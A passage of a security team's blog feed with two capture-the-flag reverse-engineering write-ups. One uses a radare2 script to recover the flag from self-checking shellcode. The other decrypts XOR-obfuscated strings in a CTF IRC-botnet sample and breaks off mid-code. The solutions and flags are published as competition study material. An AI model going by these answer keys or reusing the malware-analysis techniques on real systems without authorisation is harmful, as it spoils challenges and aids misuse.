      <category term="python_sandbox" scheme="https://teamrocketist.github.io/tags/python-sandbox/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] 34C3ctf - m0rph</title>
    <link href="https://teamrocketist.github.io/2017/12/30/Reverse-34C3ctf-m0rph/"/>
    <id>https://teamrocketist.github.io/2017/12/30/Reverse-34C3ctf-m0rph/</id>
    <published>2017-12-30T00:07:22.000Z</published>
    <updated>2017-12-30T00:15:08.429Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>m0rph 49 Solves: 163<br><br>To get you started :)<br><br>files: Link<br><br>difficulty: easy<br><br></blockquote>

<p>Opening the binary in IDA:<br><a data-fancybox="gallery" href="https://i.imgur.com/PsNIOT8.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/PsNIOT8.png" alt=""><br></a></p>
<p>As we can see <strong><code>mmap</code></strong> is being used to reserve a place in memory with <strong>read,write and execute permissions</strong>, by knowing this we can expect that some <strong>shellcode</strong> is going to be inserted in some place in the memory and then executed. The <strong>shellcode</strong> is being inserted in the final for loop that you can see in the image above, but in each run, this <strong>mini shellcodes</strong> are going to be executed in a different order because they are being randomized in <strong>sub_55C4675D7987</strong>. This isn’t a problem we can use <strong>radare2</strong> to check this shellcode on each loop iteration, by reading the <strong>shellcode</strong> we can check which byte is being checked in <strong>cmp</strong> instructions.</p>
<p>The commands I used in radare2 to this were the following:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ood argv1 <span class="comment"># starts the binary with argv1</span></div><div class="line">pdf @ main <span class="comment"># disassembles the main function</span></div><div class="line">db <span class="comment"># setting breakpoints</span></div><div class="line">dc <span class="comment"># continue</span></div><div class="line">pd <span class="number">4</span>@rax <span class="comment"># to disassemble the first 4 instructions before call rax</span></div><div class="line">dr <span class="comment"># show register values</span></div><div class="line">dr rax <span class="comment"># show a specific value of a register in this case rax</span></div><div class="line">dr rax = <span class="number">0x1</span> <span class="comment"># modifies the value of rax in this case to 0x1</span></div></pre></td></tr></table></figure>
<p>Since <a href="https://en.wikipedia.org/wiki/Position-independent_code" target="_blank" rel="external">pie protection</a> is <strong>enabled</strong>  the addresses to breakpoint will be different in each debug running attempt, to circumvent this in my python script I’m disassembling the <strong>main function</strong> and parsing the code to get this addresses. Since we don’t know the flag yet on each <strong>byte checks</strong> we can’t forget to update in the <strong>argv1</strong> string the correct bytes otherwise (before <strong>cmp</strong>), if the check goes <strong>incorrect</strong> the shellcode will call <strong>syscall_exit</strong> and terminates.</p>
<p>My radare2 script to do this (<a href="https://github.com/radare/radare2-r2pipe" target="_blank" rel="external">r2pipe</a>):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> r2pipe</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_lowest_byte</span><span class="params">(n, b)</span>:</span></div><div class="line">	<span class="keyword">return</span> n &amp; <span class="number">0xffffffffffffff00</span> | b</div><div class="line"></div><div class="line">flag_begin = <span class="string">'34C3_'</span></div><div class="line">flag = flag_begin + <span class="string">'A'</span>*(<span class="number">23</span>-len(flag_begin))</div><div class="line"></div><div class="line">r2=r2pipe.open(<span class="string">'./morph'</span>,flags=[<span class="string">'-2'</span>])</div><div class="line">r2.cmd(<span class="string">"ood %s"</span> % flag)</div><div class="line">r2.cmd(<span class="string">"aa"</span>)</div><div class="line">source_main = r2.cmd(<span class="string">"pdf @ main"</span>)</div><div class="line">bp_lines = [line <span class="keyword">for</span> line <span class="keyword">in</span> source_main.split(<span class="string">'\n'</span>) <span class="keyword">if</span> <span class="string">"call rax"</span> <span class="keyword">in</span> line]</div><div class="line">bps = [re.search(<span class="string">r'0x[0-9a-f]+'</span>, bp).group(<span class="number">0</span>) <span class="keyword">for</span> bp <span class="keyword">in</span> bp_lines]</div><div class="line"><span class="keyword">for</span> bp <span class="keyword">in</span> bps:</div><div class="line">	r2.cmd(<span class="string">'db %s'</span>%bp)</div><div class="line">r2.cmd(<span class="string">"dc"</span>)</div><div class="line">flag_bytes = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">23</span>):	</div><div class="line">	code = r2.cmd(<span class="string">"pd 4@rax"</span>)</div><div class="line">	line = code.split(<span class="string">'\n'</span>)[<span class="number">-1</span>]</div><div class="line">	finds = re.findall(<span class="string">r'0x[0-9a-f]+'</span>, line)</div><div class="line">	cmp_b = finds[<span class="number">0</span>]</div><div class="line">	flag_byte = finds[<span class="number">1</span>]</div><div class="line">	t = (int(flag_byte,<span class="number">16</span>), int(r2.cmd(<span class="string">"dr rax"</span>), <span class="number">16</span>))</div><div class="line">	flag_bytes.append(t)</div><div class="line">	r2.cmd(<span class="string">"db %s"</span> % cmp_b)</div><div class="line">	r2.cmd(<span class="string">"dc"</span>)</div><div class="line">	address = int(r2.cmd(<span class="string">"dr rax"</span>), <span class="number">16</span>)</div><div class="line">	r2.cmd(<span class="string">"dr rax = %s"</span> % hex(write_lowest_byte(address, int(flag_byte,<span class="number">16</span>))))</div><div class="line">	r2.cmd(<span class="string">"dc"</span>)</div><div class="line">flag = <span class="string">''</span></div><div class="line">flag_bytes = sorted(flag_bytes,key=<span class="keyword">lambda</span> tup: tup[<span class="number">1</span>])</div><div class="line"><span class="keyword">print</span> <span class="string">''</span>.join([chr(t[<span class="number">0</span>]) <span class="keyword">for</span> t <span class="keyword">in</span> flag_bytes])</div><div class="line">r2.quit()</div></pre></td></tr></table></figure>
<p>If you putted a breakpoint before the end, you could check the full shellcode with radare2 by using this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div></pre></td><td class="code"><pre><div class="line">[0x55769853cb95]&gt; pd 140@ 0x7f3e3151b000</div><div class="line">            ;-- rcx:</div><div class="line">            ;-- rsi:</div><div class="line">            0x7f3e3151b000      56             push rsi</div><div class="line">            0x7f3e3151b001      52             push rdx</div><div class="line">            0x7f3e3151b002      8a07           mov al, byte [rdi]</div><div class="line">            0x7f3e3151b004      3c33           cmp al, 0x33            ; &apos;3&apos; ; 51</div><div class="line">        ,=&lt; 0x7f3e3151b006      0f85db020000   jne 0x7f3e3151b2e7</div><div class="line">       ,==&lt; 0x7f3e3151b00c      e9b8020000     jmp 0x7f3e3151b2c9</div><div class="line">       ||   0x7f3e3151b011      56             push rsi</div><div class="line">       ||   0x7f3e3151b012      52             push rdx</div><div class="line">       ||   0x7f3e3151b013      8a07           mov al, byte [rdi]</div><div class="line">       ||   0x7f3e3151b015      3c34           cmp al, 0x34            ; &apos;4&apos; ; 52</div><div class="line">      ,===&lt; 0x7f3e3151b017      0f85ca020000   jne 0x7f3e3151b2e7</div><div class="line">     ,====&lt; 0x7f3e3151b01d      e9a7020000     jmp 0x7f3e3151b2c9</div><div class="line">     ||||   0x7f3e3151b022      56             push rsi</div><div class="line">     ||||   0x7f3e3151b023      52             push rdx</div><div class="line">     ||||   0x7f3e3151b024      8a07           mov al, byte [rdi]</div><div class="line">     ||||   0x7f3e3151b026      3c43           cmp al, 0x43            ; &apos;C&apos; ; 67</div><div class="line">    ,=====&lt; 0x7f3e3151b028      0f85b9020000   jne 0x7f3e3151b2e7</div><div class="line">   ,======&lt; 0x7f3e3151b02e      e996020000     jmp 0x7f3e3151b2c9</div><div class="line">   ||||||   0x7f3e3151b033      56             push rsi</div><div class="line">   ||||||   0x7f3e3151b034      52             push rdx</div><div class="line">   ||||||   0x7f3e3151b035      8a07           mov al, byte [rdi]</div><div class="line">   ||||||   0x7f3e3151b037      3c33           cmp al, 0x33            ; &apos;3&apos; ; 51</div><div class="line">  ,=======&lt; 0x7f3e3151b039      0f85a8020000   jne 0x7f3e3151b2e7</div><div class="line">  ========&lt; 0x7f3e3151b03f      e985020000     jmp 0x7f3e3151b2c9</div><div class="line">  |||||||   0x7f3e3151b044      56             push rsi</div><div class="line">  |||||||   0x7f3e3151b045      52             push rdx</div><div class="line">  |||||||   0x7f3e3151b046      8a07           mov al, byte [rdi]</div><div class="line">  |||||||   0x7f3e3151b048      3c5f           cmp al, 0x5f            ; &apos;_&apos; ; 95</div><div class="line">  ========&lt; 0x7f3e3151b04a      0f8597020000   jne 0x7f3e3151b2e7</div><div class="line">  ========&lt; 0x7f3e3151b050      e974020000     jmp 0x7f3e3151b2c9</div><div class="line">  |||||||   0x7f3e3151b055      56             push rsi</div><div class="line">  |||||||   0x7f3e3151b056      52             push rdx</div><div class="line">  |||||||   0x7f3e3151b057      8a07           mov al, byte [rdi]</div><div class="line">  |||||||   0x7f3e3151b059      3c4d           cmp al, 0x4d            ; &apos;M&apos; ; 77</div><div class="line">  ========&lt; 0x7f3e3151b05b      0f8586020000   jne 0x7f3e3151b2e7</div><div class="line">  ========&lt; 0x7f3e3151b061      e963020000     jmp 0x7f3e3151b2c9</div><div class="line">  |||||||   0x7f3e3151b066      56             push rsi</div><div class="line">  |||||||   0x7f3e3151b067      52             push rdx</div><div class="line">  |||||||   0x7f3e3151b068      8a07           mov al, byte [rdi]</div><div class="line">  |||||||   0x7f3e3151b06a      3c31           cmp al, 0x31            ; &apos;1&apos; ; 49</div><div class="line">  ========&lt; 0x7f3e3151b06c      0f8575020000   jne 0x7f3e3151b2e7</div><div class="line">  ========&lt; 0x7f3e3151b072      e952020000     jmp 0x7f3e3151b2c9</div><div class="line">  |||||||   0x7f3e3151b077      56             push rsi</div><div class="line">  |||||||   0x7f3e3151b078      52             push rdx</div><div class="line">  |||||||   0x7f3e3151b079      8a07           mov al, byte [rdi]</div><div class="line">  |||||||   0x7f3e3151b07b      3c47           cmp al, 0x47            ; &apos;G&apos; ; 71</div><div class="line">  ========&lt; 0x7f3e3151b07d      0f8564020000   jne 0x7f3e3151b2e7</div><div class="line">  ========&lt; 0x7f3e3151b083      e941020000     jmp 0x7f3e3151b2c9</div><div class="line">  |||||||   0x7f3e3151b088      56             push rsi</div><div class="line">  |||||||   0x7f3e3151b089      52             push rdx</div><div class="line">  |||||||   0x7f3e3151b08a      8a07           mov al, byte [rdi]</div><div class="line">  |||||||   0x7f3e3151b08c      3c48           cmp al, 0x48            ; &apos;H&apos; ; 72</div><div class="line">  ========&lt; 0x7f3e3151b08e      0f8553020000   jne 0x7f3e3151b2e7</div><div class="line">  ========&lt; 0x7f3e3151b094      e930020000     jmp 0x7f3e3151b2c9</div><div class="line">  |||||||   0x7f3e3151b099      56             push rsi</div><div class="line">  |||||||   0x7f3e3151b09a      52             push rdx</div><div class="line">  |||||||   0x7f3e3151b09b      8a07           mov al, byte [rdi]</div><div class="line">  |||||||   0x7f3e3151b09d      3c54           cmp al, 0x54            ; &apos;T&apos; ; 84</div><div class="line">  ========&lt; 0x7f3e3151b09f      0f8542020000   jne 0x7f3e3151b2e7</div><div class="line">  ========&lt; 0x7f3e3151b0a5      e91f020000     jmp 0x7f3e3151b2c9</div><div class="line">  |||||||   0x7f3e3151b0aa      56             push rsi</div><div class="line">  |||||||   0x7f3e3151b0ab      52             push rdx</div><div class="line">  |||||||   0x7f3e3151b0ac      8a07           mov al, byte [rdi]</div><div class="line">  |||||||   0x7f3e3151b0ae      3c59           cmp al, 0x59            ; &apos;Y&apos; ; 89</div><div class="line">  ========&lt; 0x7f3e3151b0b0      0f8531020000   jne 0x7f3e3151b2e7</div><div class="line">  ========&lt; 0x7f3e3151b0b6      e90e020000     jmp 0x7f3e3151b2c9</div><div class="line">  |||||||   0x7f3e3151b0bb      56             push rsi</div><div class="line">  |||||||   0x7f3e3151b0bc      52             push rdx</div><div class="line">  |||||||   0x7f3e3151b0bd      8a07           mov al, byte [rdi]</div><div class="line">  |||||||   0x7f3e3151b0bf      3c5f           cmp al, 0x5f            ; &apos;_&apos; ; 95</div><div class="line">  ========&lt; 0x7f3e3151b0c1      0f8520020000   jne 0x7f3e3151b2e7</div><div class="line">  ========&lt; 0x7f3e3151b0c7      e9fd010000     jmp 0x7f3e3151b2c9</div><div class="line">  |||||||   0x7f3e3151b0cc      56             push rsi</div><div class="line">  |||||||   0x7f3e3151b0cd      52             push rdx</div><div class="line">  |||||||   0x7f3e3151b0ce      8a07           mov al, byte [rdi]</div><div class="line">  |||||||   0x7f3e3151b0d0      3c4d           cmp al, 0x4d            ; &apos;M&apos; ; 77</div><div class="line">  ========&lt; 0x7f3e3151b0d2      0f850f020000   jne 0x7f3e3151b2e7</div><div class="line">  ========&lt; 0x7f3e3151b0d8      e9ec010000     jmp 0x7f3e3151b2c9</div><div class="line">  |||||||   0x7f3e3151b0dd      56             push rsi</div><div class="line">  |||||||   0x7f3e3151b0de      52             push rdx</div><div class="line">  |||||||   0x7f3e3151b0df      8a07           mov al, byte [rdi]</div><div class="line">  |||||||   0x7f3e3151b0e1      3c30           cmp al, 0x30            ; &apos;0&apos; ; 48</div><div class="line">  ========&lt; 0x7f3e3151b0e3      0f85fe010000   jne 0x7f3e3151b2e7</div><div class="line">  ========&lt; 0x7f3e3151b0e9      e9db010000     jmp 0x7f3e3151b2c9</div><div class="line">  |||||||   0x7f3e3151b0ee      56             push rsi</div><div class="line">  |||||||   0x7f3e3151b0ef      52             push rdx</div><div class="line">  |||||||   0x7f3e3151b0f0      8a07           mov al, byte [rdi]</div><div class="line">  |||||||   0x7f3e3151b0f2      3c52           cmp al, 0x52            ; &apos;R&apos; ; 82</div><div class="line">  ========&lt; 0x7f3e3151b0f4      0f85ed010000   jne 0x7f3e3151b2e7</div><div class="line">  ========&lt; 0x7f3e3151b0fa      e9ca010000     jmp 0x7f3e3151b2c9</div><div class="line">  |||||||   0x7f3e3151b0ff      56             push rsi</div><div class="line">  |||||||   0x7f3e3151b100      52             push rdx</div><div class="line">  |||||||   0x7f3e3151b101      8a07           mov al, byte [rdi]</div><div class="line">  |||||||   0x7f3e3151b103      3c50           cmp al, 0x50            ; &apos;P&apos; ; 80</div><div class="line">  ========&lt; 0x7f3e3151b105      0f85dc010000   jne 0x7f3e3151b2e7</div><div class="line">  ========&lt; 0x7f3e3151b10b      e9b9010000     jmp 0x7f3e3151b2c9</div><div class="line">  |||||||   0x7f3e3151b110      56             push rsi</div><div class="line">  |||||||   0x7f3e3151b111      52             push rdx</div><div class="line">  |||||||   0x7f3e3151b112      8a07           mov al, byte [rdi]</div><div class="line">  |||||||   0x7f3e3151b114      3c68           cmp al, 0x68            ; &apos;h&apos; ; 104</div><div class="line">  ========&lt; 0x7f3e3151b116      0f85cb010000   jne 0x7f3e3151b2e7</div><div class="line">  ========&lt; 0x7f3e3151b11c      e9a8010000     jmp 0x7f3e3151b2c9</div><div class="line">  |||||||   0x7f3e3151b121      56             push rsi</div><div class="line">  |||||||   0x7f3e3151b122      52             push rdx</div><div class="line">  |||||||   0x7f3e3151b123      8a07           mov al, byte [rdi]</div><div class="line">  |||||||   0x7f3e3151b125      3c31           cmp al, 0x31            ; &apos;1&apos; ; 49</div><div class="line">  ========&lt; 0x7f3e3151b127      0f85ba010000   jne 0x7f3e3151b2e7</div><div class="line">  ========&lt; 0x7f3e3151b12d      e997010000     jmp 0x7f3e3151b2c9</div><div class="line">  |||||||   ;-- rax:</div><div class="line">  |||||||   0x7f3e3151b132      56             push rsi</div><div class="line">  |||||||   0x7f3e3151b133      52             push rdx</div><div class="line">  |||||||   0x7f3e3151b134      8a07           mov al, byte [rdi]</div><div class="line">  |||||||   0x7f3e3151b136      3c6e           cmp al, 0x6e            ; &apos;n&apos; ; 110</div><div class="line">  ========&lt; 0x7f3e3151b138      0f85a9010000   jne 0x7f3e3151b2e7</div><div class="line">  ========&lt; 0x7f3e3151b13e      e986010000     jmp 0x7f3e3151b2c9</div><div class="line">  |||||||   0x7f3e3151b143      56             push rsi</div><div class="line">  |||||||   0x7f3e3151b144      52             push rdx</div><div class="line">  |||||||   0x7f3e3151b145      8a07           mov al, byte [rdi]</div><div class="line">  |||||||   0x7f3e3151b147      3c47           cmp al, 0x47            ; &apos;G&apos; ; 71</div><div class="line">  ========&lt; 0x7f3e3151b149      0f8598010000   jne 0x7f3e3151b2e7</div><div class="line">  ========&lt; 0x7f3e3151b14f      e975010000     jmp 0x7f3e3151b2c9</div><div class="line">  |||||||   0x7f3e3151b154      56             push rsi</div><div class="line">  |||||||   0x7f3e3151b155      52             push rdx</div><div class="line">  |||||||   0x7f3e3151b156      8a07           mov al, byte [rdi]</div><div class="line">  |||||||   0x7f3e3151b158      3c5f           cmp al, 0x5f            ; &apos;_&apos; ; 95</div><div class="line">  ========&lt; 0x7f3e3151b15a      0f8587010000   jne 0x7f3e3151b2e7</div><div class="line">  ========&lt; 0x7f3e3151b160      e964010000     jmp 0x7f3e3151b2c9</div><div class="line">  |||||||   0x7f3e3151b165      56             push rsi</div><div class="line">  |||||||   0x7f3e3151b166      52             push rdx</div><div class="line">  |||||||   0x7f3e3151b167      8a07           mov al, byte [rdi]</div><div class="line">  |||||||   0x7f3e3151b169      3c67           cmp al, 0x67            ; &apos;g&apos; ; 103</div><div class="line">  ========&lt; 0x7f3e3151b16b      0f8576010000   jne 0x7f3e3151b2e7</div><div class="line">  ========&lt; 0x7f3e3151b171      e953010000     jmp 0x7f3e3151b2c9</div><div class="line">  |||||||   0x7f3e3151b176      56             push rsi</div><div class="line">  |||||||   0x7f3e3151b177      52             push rdx</div><div class="line">  |||||||   0x7f3e3151b178      8a07           mov al, byte [rdi]</div><div class="line">  |||||||   0x7f3e3151b17a      3c30           cmp al, 0x30            ; &apos;0&apos; ; 48</div><div class="line">  ========&lt; 0x7f3e3151b17c      0f8565010000   jne 0x7f3e3151b2e7</div><div class="line">  ========&lt; 0x7f3e3151b182      e942010000     jmp 0x7f3e3151b2c9</div></pre></td></tr></table></figure>
<p>As you can you can see you can already check the flag and all comparisons that were being made, in my python script I was saving the addresses where each <strong>mini shellcode</strong> starts, so I could sort <strong>the byte order</strong> to get the right flag in the end:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python morph.py</div><div class="line">34C3_M1GHTY_M0RPh1nG_g0</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;m0rph 49 Solves: 163&lt;br&gt;&lt;br&gt;To get you started :)&lt;br&gt;&lt;br&gt;files: Link&lt;br&gt;&lt;br&gt;difficulty: easy&lt;br&gt;&lt;br&gt;&lt;/blockquote&gt;

&lt;p&gt;Openin
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="shellcode" scheme="https://teamrocketist.github.io/tags/shellcode/"/>
    
      <category term="radare2" scheme="https://teamrocketist.github.io/tags/radare2/"/>
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="radare2_script" scheme="https://teamrocketist.github.io/tags/radare2-script/"/>
    
      <category term="mmap" scheme="https://teamrocketist.github.io/tags/mmap/"/>
    
      <category term="34C3ctf2017" scheme="https://teamrocketist.github.io/tags/34C3ctf2017/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] 3DS - IRC Bot Takeover</title>
    <link href="https://teamrocketist.github.io/2017/12/19/Reverse-3DS-IRC-Bot-Takeover/"/>
    <id>https://teamrocketist.github.io/2017/12/19/Reverse-3DS-IRC-Bot-Takeover/</id>
    <published>2017-12-19T22:09:52.000Z</published>
    <updated>2017-12-19T22:34:27.086Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>IRC Bot Takeover - 486 Points<br><br>WARNING! DON’T EXECUTE THIS SAMPLE IN YOUR OWN PERSONAL MACHINE!!!<br><br><br>Update: We had some problems with a specific step of the challenge (still possible to solve, but more hard) and we updated the binary. The new file has the old version, but you only need the new to solve.<br></blockquote>

<p>This malware was about controlling a bot net via IRC, we were allowed to access it since the url and port were bot present in the binary, but we didn’t really needed to access it to solve this, unless you infected a machine of yours to debug it to understand better how the malware works(some people actually did this I saw some bots from other players in a channel in IRC we actually could control them lol).</p>
<p>This challenge as in <a href="https://teamrocketist.github.io/2017/12/18/Reverse-3DS-Ransomware/">Ransomware</a>  and <a href="https://teamrocketist.github.io/2017/12/19/Reverse-3DS-W32-killah/">w32.killah</a> is once again to decrypt obfuscated strings, but this time they are encrypting the string two times:</p>
<p><a data-fancybox="gallery" href="https://i.imgur.com/xRpDE8F.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/xRpDE8F.png" alt=""><br></a></p>
<p>There were two executables, one of them was useless the one that has the encrypted flag was <strong>bot.exe</strong>.</p>
<p>The code above is present at the sub-routine <strong>sub_4012E1</strong> if you use IDA open the binary (bot.exe executable). Once again the xor_encryption2 is exactly like <a href="https://teamrocketist.github.io/2017/12/19/Reverse-3DS-W32-killah/">w32.killah</a>, I had to brute force the key once again, but this time since they are encrypting twice I need to brute force two keys instead of one:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_encrytion</span><span class="params">(al, ecx, edx)</span>:</span></div><div class="line">	c = <span class="string">''</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(ecx):</div><div class="line">		n = chr((((ord(edx[i]) + ord(al))%<span class="number">256</span>) ^ ord(al)) %<span class="number">256</span>)</div><div class="line">		s = chr(ord(edx[i]) ^ ord(al))</div><div class="line">		<span class="comment">#print n,s</span></div><div class="line">		<span class="keyword">if</span> s <span class="keyword">in</span> string.printable:</div><div class="line">			c += s</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			c += n</div><div class="line">		<span class="comment">#print c</span></div><div class="line">	<span class="keyword">return</span> c</div><div class="line"></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0xff</span>):</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0xff</span>):</div><div class="line">		e = xor_encrytion(al=chr(i), ecx=<span class="number">0x10</span><span class="number">-1</span>, edx=<span class="string">'%&lt;EmqhiYUi0deY\\'</span>)</div><div class="line">		h = xor_encrytion(al=chr(j), ecx=<span class="number">0x10</span><span class="number">-1</span>, edx=e)</div><div class="line">		<span class="keyword">print</span> h, i, j</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0xff</span>):</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0xff</span>):</div><div class="line">		e = xor_encrytion(al=chr(i), ecx=<span class="number">0x12</span><span class="number">-1</span>, edx=<span class="string">'mckW,sSWisWdak3!u'</span>)</div><div class="line">		h = xor_encrytion(al=chr(j), ecx=<span class="number">0x12</span><span class="number">-1</span>, edx=e)</div><div class="line">		<span class="keyword">print</span> h, i, j</div></pre></td></tr></table></figure>
<p>The first part of the flag:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ python ircbot.py | grep <span class="string">'3DS&#123;'</span></div><div class="line">3DS&#123;wpwgcw8lsgd 139 8</div><div class="line">3DS&#123;who_<span class="comment">#o0ls_d 229 98</span></div><div class="line">3DS&#123;who_<span class="comment">#o0ls_d 228 99</span></div><div class="line">3DS&#123;who_<span class="comment">#o0ls_d 230 99</span></div><div class="line">3DS&#123;who_co0ls_d 133 130</div><div class="line">3DS&#123;who_co0ls_d 132 131</div><div class="line">3DS&#123;who_co0ls_d 134 131</div></pre></td></tr></table></figure></p>
<p>The rest:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">$ python ircbot.py | grep <span class="string">'&#125;\s'</span></div><div class="line">...</div><div class="line">...</div><div class="line">uck_4sS_is_lak3!&#125; 224 100</div><div class="line">uow[4^?_[i^?[law?!&#125; 226 100</div><div class="line">Ec&#123;_^DsS_ys_la&#123;3!&#125; 232 100</div><div class="line">EoGk^D^?_ky^?klaG?!&#125; 234 100</div><div class="line">komQ*^?UQo^?Qlam5<span class="string">'&#125; 96 102</span></div><div class="line"><span class="string">ukoS(&#123;WSm&#123;Slao7%&#125; 98 102</span></div><div class="line"><span class="string">EmGY"^?]Yy^?YjoG=/&#125; 104 102</span></div><div class="line"><span class="string">EoC[ &#123;_[y&#123;[lmC?-&#125; 106 102</span></div><div class="line"><span class="string">uow[4^?_[i^?[law?!&#125; 224 102</span></div><div class="line"><span class="string">...</span></div><div class="line"><span class="string">...</span></div></pre></td></tr></table></figure>
<p>A simple script to join the parts of the flag since we now know the keys:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span 